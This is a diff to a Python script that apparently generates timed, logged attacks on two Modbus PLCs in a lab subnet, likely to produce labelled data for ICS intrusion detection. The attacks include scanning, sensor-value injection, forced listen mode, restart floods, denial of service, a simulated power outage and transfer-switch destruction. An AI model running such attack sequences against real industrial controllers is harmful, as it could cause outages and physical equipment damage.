@@ -10,6 +10,11 @@ import attacker
 import random
 import time
 import subprocess
+from datetime import timezone
+import datetime
+
+# constants
+FILENAME = "timestamps/"+datetime.datetime.now(timezone.utc).strftime('%d-%M:%S-timestamps.txt')
 
 #########################################################################################
 # Function: recon
@@ -19,10 +24,13 @@ import subprocess
 def recon():
     # port/address scan
     attacker.address_scan("192.168.0.0/24")
+    time.sleep(5)
     # found Modbus devices - 192.168.0.21, 192.168.0.22
     attacker.function_code_scan(["192.168.0.21", "192.168.0.22"])
+    time.sleep(5)
     # device identification - function code 0x08
     attacker.device_identification_attack(["192.168.0.21", "192.168.0.22"])
+    time.sleep(5)
     # naively read sensor values to find used coils/registers
     attacker.naive_sensor_read(["192.168.0.21", "192.168.0.22"])
 
@@ -32,6 +40,7 @@ def recon():
 def sporadic_injections():
     # port/address scan
     attacker.address_scan("192.168.0.0/24")
+    time.sleep(5)
     # found Modbus devices - 192.168.0.21, 192.168.0.22
     # inject values sporadically to all devices
     attacker.sporadic_sensor_measurement_injection(["192.168.0.21", "192.168.0.22"])
@@ -51,6 +60,7 @@ def sporadic_injections():
 def disable_devices():
     # scan network
     attacker.address_scan("192.168.0.0/24")
+    time.sleep(5)
     # found Modbus devices - 192.168.0.21, 192.168.0.22
     attacker.force_listen_mode(["192.168.0.21", "192.168.0.22"])
     
@@ -69,6 +79,7 @@ def disable_devices():
 def disable_devices_through_restarting():
     # scan network
     attacker.address_scan("192.168.0.0/24")
+    time.sleep(5)
     # send multiple Restart Communication requests (until enter key is pressed)
     attacker.restart_communication(["192.168.0.21", "192.168.0.22"])
 
@@ -87,6 +98,7 @@ def dos():
 def find_exploits():
     # address scan to find Modbus devices
     attacker.address_scan("192.168.0.0/24")
+    time.sleep(5)
     # device identification attack for device-related exploits
     attacker.device_identification_attack(["192.168.0.21", "192.168.0.22"])
 
@@ -96,8 +108,11 @@ def find_exploits():
 def power_outage():
     # get information to find control set points to change
     attacker.address_scan("192.168.0.0/24")
+    time.sleep(5)
     attacker.function_code_scan(["192.168.0.21", "192.168.0.22"])
+    time.sleep(5)
     attacker.naive_sensor_read(["192.168.0.21", "192.168.0.22"])
+    time.sleep(5)
     # pick a device
     device_dict = {"plc1": "192.168.0.21", "plc2": "192.168.0.22"}
     victim = random.choice(list(device_dict.items()))
@@ -121,8 +136,11 @@ def power_outage():
 def destroy_switch():
     # get information to find values controlling transfer switch
     attacker.address_scan("192.168.0.0/24")
+    time.sleep(5)
     attacker.function_code_scan(["192.168.0.21", "192.168.0.22"])
+    time.sleep(5)
     attacker.naive_sensor_read(["192.168.0.21", "192.168.0.22"])
+    time.sleep(5)
     # pick a device
     device_dict = {"plc1": "192.168.0.21", "plc2": "192.168.0.22"}
     victim = random.choice(list(device_dict.items()))
@@ -141,6 +159,25 @@ def destroy_switch():
 #########################################################################################
 # Objective 10: Simulate greater-than-normal solar power generation
 # TODO:
+
+
+def start_attack(func, objective_number):
+        # print to file timestamping when attack starts
+        dt = datetime.datetime.now(timezone.utc)
+        formatted_time = dt.strftime('%H:%M:%S') + f'.{dt.microsecond}'
+        with open(FILENAME, 'a') as file:
+            file.write(f'objective{objective_number}: {formatted_time} : start\n')
+
+        # perform attack
+        print(f"\n\nObjective {objective_number} started\n\n")
+        func()
+        print(f"\n\nObjective {objective_number} finished\n\n")
+
+        # print to file timestamping when attack ends
+        dt = datetime.datetime.now(timezone.utc)
+        formatted_time = dt.strftime('%H:%M:%S') + f'.{dt.microsecond}'
+        with open(FILENAME, 'a') as file:
+            file.write(f'objective{objective_number}: {formatted_time} : end\n')
 
 if __name__ == "__main__":
     print(r"""\
@@ -170,32 +207,33 @@ if __name__ == "__main__":
              """)
 
     while True:
-        # perform a random attack every 6 to 10 minutes
-        selection = random.randint(1, 7)
+        selections = list(range(1, 9))
 
-        print("Waiting a random amount of time before next attack...")
-        wait_time = random.randint(6, 10) * 60
+        while selections:
+            # perform a random attack, ensuring each attack is performed once
+            selection = random.choice(selections)
+            selections.remove(selection)
 
-        time.sleep(wait_time)
+            print("Waiting a random amount of time (2 to 4 minutes) before next attack...")
+            wait_time = random.randint(2 * 60, 4 * 60)
 
-        if selection == 1:
-            recon()
-            print("\n\nObjective 1 finished\n\n")
-        elif selection == 2:
-            sporadic_injections()
-            print("\n\nObjective 2 finished\n\n")
-        elif selection == 3:
-            disable_devices()
-            print("\n\nObjective 3 finished\n\n")
-        elif selection == 4:
-            disable_devices_through_restarting()
-            print("\n\nObjective 4 finished\n\n")
-        elif selection == 5:
-            dos()
-            print("\n\nObjective 5 finisehd\n\n")
-        elif selection == 6:
-            power_outage()
-            print("\n\nObjective 6 finished\n\n")
-        elif selection == 7:
-            destroy_switch()
-            print("\n\nObjective 7 finished\n\n")
+
+            time.sleep(wait_time)
+
+            # perform attack
+            if selection == 1:
+                start_attack(recon, 1)
+            elif selection == 2:
+                start_attack(sporadic_injections, 2)
+            elif selection == 3:
+                start_attack(disable_devices, 3)
+            elif selection == 4:
+                start_attack(disable_devices_through_restarting, 4)
+            elif selection == 5:
+                start_attack(dos, 5)
+            elif selection == 6:
+                start_attack(find_exploits, 6)
+            elif selection == 7:
+                start_attack(power_outage, 7)
+            elif selection == 8:
+                start_attack(destroy_switch, 8)
